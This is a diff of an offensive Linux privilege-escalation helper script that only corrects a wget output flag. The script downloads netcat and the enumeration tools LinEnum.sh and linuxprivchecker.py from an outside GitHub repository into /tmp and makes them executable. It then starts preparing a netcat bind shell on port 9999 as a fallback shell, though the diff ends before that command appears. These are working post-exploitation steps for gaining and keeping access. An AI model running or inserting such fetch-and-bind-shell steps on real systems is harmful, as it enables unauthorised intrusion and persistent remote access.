@@ -10,17 +10,17 @@ echo "[]________________________________________________________________________
 
 # download NC
 echo "[*] Downloading NC to: /tmp/ + making executable"
-wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/nc -o /tmp/nc
+wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/nc -O /tmp/nc
 chmod +x /tmp/nc
 
 # download linenum.sh
 echo "[*] Downloading linenum.sh to: /tmp/ + making executable"
-wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinEnum.sh -o /tmp/linenum.sh
+wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinEnum.sh -O /tmp/linenum.sh
 chmod +x /tmp/linenum.sh
 
 # download LinxPrivChecker.py
 echo "[*] Downloading LinuxPrivChecker.sh to: /tmp/ + making executable"
-wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linuxprivchecker.py -o /tmp/LPC.py
+wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linuxprivchecker.py -O /tmp/LPC.py
 
 # build a NC bind shell incase we lose a shell
 echo "[*] Attempting to bind a shell to 9999 incase you lose your shell"
